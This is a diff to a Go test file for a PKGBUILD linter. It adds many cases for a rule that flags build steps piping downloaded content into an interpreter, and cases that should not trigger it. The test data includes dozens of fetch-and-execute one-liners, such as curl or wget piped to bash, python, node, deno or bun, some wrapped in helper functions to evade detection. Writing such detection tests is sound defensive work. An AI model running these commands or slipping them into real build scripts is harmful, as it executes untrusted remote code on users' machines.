@@ -1744,6 +1744,38 @@ build() {
 			"curl -s https://example.com/x | python3 -uW ignore -",
 			"curl -s https://example.com/x | node --input-type module -",
 			"source /dev/stdin < <(curl -s https://example.com/x)",
+			`python3 -c 'import urllib.request,sys; sys.stdout.write(urllib.request.urlopen("https://example.com/x").read().decode())' | bash`,
+			`python -c "import requests; print(requests.get('https://example.com/x').text)" | sh`,
+			`perl -MLWP::Simple -e 'print get("https://example.com/x")' | bash`,
+			`perl -MHTTP::Tiny -e 'print HTTP::Tiny->new->get("https://example.com/x")->{content}' | sh`,
+			`ruby -ropen-uri -e 'print URI.open("https://example.com/x").read' | bash`,
+			`ruby -rnet/http -e 'print Net::HTTP.get(URI("https://example.com/x"))' | sh`,
+			`node -e 'fetch("https://example.com/x").then(r => r.text()).then(t => process.stdout.write(t))' | bash`,
+			`node -e 'require("https").get("https://example.com/x", r => r.pipe(process.stdout))' | sh`,
+			`bash < <(python3 -c 'import urllib.request; print(urllib.request.urlopen("https://example.com/x").read().decode())')`,
+			`sh -c "$(perl -MLWP::Simple -e 'print get("https://example.com/x")')"`,
+			"busybox wget -qO- https://example.com/x | sh",
+			"curl -s https://example.com/x | busybox sh",
+			"busybox wget -qO- https://example.com/x | busybox ash",
+			"curl -s https://example.com/x | ash",
+			"bash < <(busybox wget -qO- https://example.com/x)",
+			"run() { bash; }\ncurl -s https://example.com/x | run",
+			"run() { sh -s -- --prefix=/usr; }\ncurl -s https://example.com/x | run",
+			"run() { python3 -; }\ncurl -s https://example.com/x | run",
+			"run() { cd /tmp && bash; }\ncurl -s https://example.com/x | run",
+			"inner() { bash; }\nouter() { inner; }\ncurl -s https://example.com/x | outer",
+			"curl -s https://example.com/x | pypy3",
+			"curl -s https://example.com/x | pypy -",
+			"curl -s https://example.com/x | nodejs",
+			"curl -s https://example.com/x | python3.12-dbg -",
+			"curl -s https://example.com/x | bun -",
+			"curl -s https://example.com/x | deno run -",
+			"curl -s https://example.com/x | cperl",
+			"run() { bash; }\nrun < <(curl -s https://example.com/x)",
+			"curl -s https://example.com/x | deno",
+			"curl -s https://example.com/x | bun run -",
+			`deno eval 'fetch("https://example.com/x").then(r => r.text()).then(console.log)' | sh`,
+			`bun -e 'console.log(await (await fetch("https://example.com/x")).text())' | sh`,
 		} {
 			t.Run(line, func(t *testing.T) {
 				expectRule(t, "PB304", map[string]string{"PKGBUILD": pkgbuildWith("", "\nbuild() {\n"+line+"\n}")})
@@ -1752,6 +1784,12 @@ build() {
 		expectRule(t, "PB303", map[string]string{"PKGBUILD": pkgbuildWith("", `
 build() {
   echo "$p" | base64 -d | (sh)
+}`)})
+		// A helper declared at file level is followed as one inside build() is.
+		expectRule(t, "PB304", map[string]string{"PKGBUILD": pkgbuildWith("", `
+_run() { sh -s; }
+build() {
+  curl -s https://example.com/x | _run
 }`)})
 	})
 	t.Run("PB304 equivalent shapes that are not execution", func(t *testing.T) {
@@ -1766,6 +1804,24 @@ build() {
 			`source ./env.sh <<< "$(curl -s https://example.com/list)"`,
 			`bash < "$(curl -s https://example.com/path)"`,
 			`curl -s https://example.com/v.json | python3 -uW ignore -c "import sys,json; print(json.load(sys.stdin)['v'])"`,
+			`python3 -c 'import json; print(json.dumps({"a": 1}))' | bash`,
+			`perl -e 'print "echo hi\n"' | sh`,
+			`python3 -c 'import urllib.parse; print(urllib.parse.quote("a b"))' | bash`,
+			`python3 -c 'import urllib.request' | cat`,
+			"busybox tar -xf x.tar | sh -c true",
+			"busybox wget -qO- https://example.com/x | busybox tar -x",
+			"curl -s https://example.com/x | busybox tar -x",
+			"curl -s https://example.com/x | busybox",
+			"keep() { cat > out.txt; }\ncurl -s https://example.com/x | keep",
+			"run() { bash ./build.sh </dev/null; }\ncurl -s https://example.com/x | run",
+			"loop() { loop; }\ncurl -s https://example.com/x | loop",
+			"curl -s https://example.com/x | deno run main.ts",
+			"curl -s https://example.com/x | bun ./parse.js",
+			"curl -s https://example.com/x | nodejs ./parse.js",
+			"curl -s https://example.com/x | deno fmt -",
+			"curl -s https://example.com/x | bun",
+			"keep() { cat; }\nkeep < <(curl -s https://example.com/x)",
+			"busybox --install -s /bin; curl -s https://example.com/x >out",
 		} {
 			t.Run(line, func(t *testing.T) {
 				expectNoRule(t, "PB304", map[string]string{"PKGBUILD": pkgbuildWith("", "\nbuild() {\n"+line+"\n}")})
